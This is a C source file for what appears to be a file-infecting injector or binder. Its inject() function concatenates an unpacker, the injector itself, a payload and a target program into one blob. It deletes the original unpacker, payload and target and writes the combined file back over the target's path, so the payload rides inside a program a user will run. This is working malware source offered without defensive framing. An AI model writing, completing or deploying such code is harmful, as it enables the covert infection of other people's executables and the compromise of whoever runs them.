#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>


#include "utils.c"


#ifdef _WIN32
    #define _CRT_NONSTDC_NO_WARNINGS
#endif


bool inject(
    const char *unpacker,
    const char *injector,
    const char *payload,
    const char *target
) {
    FILE *tmp_file = tmpfile();
    if (tmp_file == NULL) {
        perror("Couldn't create tmpfile().");
        return false;
    }

    if (!read_path_into_fp(unpacker, tmp_file, -1))
        return false;

    if (remove(unpacker))
        return false;
    
    if (!read_path_into_fp(injector, tmp_file, -1))
        return false;

    // This can't be done here, unpacker will take care of this
    // if (remove(injector))
    //     return false;

    if (!read_path_into_fp(payload, tmp_file, -1))
        return false;

    if (remove(payload))
        return false;
    
    if (!read_path_into_fp(target, tmp_file, -1))
        return false;

    if (remove(target))
        return false;

    if (fseek(tmp_file, 0, SEEK_SET) == -1) {
        perror("Couldn't seek to beginning of tmpfile() for copying");
        return false;
    }

    if (!read_fp_into_path(tmp_file, target, -1))
        return false;

    if (fclose(tmp_file) == EOF)
        return false;

    return true;
}


int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Syntax: '%s' UNPACKER PAYLOAD TARGET", argv[0]);
        return 1;
    }

    if (!inject(argv[1], argv[0], argv[2], argv[3])) {
        perror(strerror(errno));
        return 1;
    }

    return 0;
}

